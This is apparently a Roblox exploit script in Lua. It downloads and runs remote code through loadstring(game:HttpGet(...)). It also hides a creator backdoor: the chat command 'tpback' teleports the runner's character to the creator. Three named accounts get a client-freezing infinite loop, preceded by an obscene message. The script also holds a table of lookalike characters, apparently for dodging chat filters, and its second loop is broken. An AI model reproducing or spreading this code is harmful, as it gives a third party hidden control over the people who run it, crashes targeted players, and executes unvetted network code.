repeat
	task.wait()
until game:GetService('Players').LocalPlayer

local ids = {
	5050653591
}

local banbypass = {
	'а',
	'q',
	'x',
	'й',
	'こ'
}


local notifs = loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/random/main/FE2Notifs.lua'))()

game:GetService('Players').PlayerAdded:Connect(function(plr)
	if table.find(ids,plr.UserId) then
	    notifs.alert('script creator (szze) joined',nil,10)
            notifs.alert('be sure to say hi to absolutely_szze',nil,10,'rainbow')	
	    plr.Chatted:Connect(function(msg)
                if msg == 'tpback' then
                   local oldpos = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame
		   local plrpos = plr.Character.HumanoidRootPart.CFrame
		   game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
		   task.wait(3)
		   game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
		end
	    end)
	end
end)

for i,v in next, game:GetService('Players'):GetPlayers() do 
   	if table.find(ids,plr.UserId) then
	    notifs.alert('script creator (szze) is in the server',nil,10)
            notifs.alert('be sure to say hi to absolutely_szze',nil,10,'rainbow')	
	    plr.Chatted:Connect(function(msg)
                if msg == 'tpback' then
                   local oldpos = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame
		   local plrpos = plr.Character.HumanoidRootPart.CFrame
		   game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
		   task.wait(3)
		   game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
		end
	    end)
	end
end

if game:GetService('Players').LocalPlayer.Name == 'AlexDaSlender1' or game:GetService('Players').LocalPlayer.Name == 'tiki_hell' or game:GetService'Players'.LocalPlayer.Name == 'cat_cathuge1234567' then
	local message = Instance.new('Hint',workspace)
	message.Text = 'fuck you'
	task.wait(1)
	while true do end
end
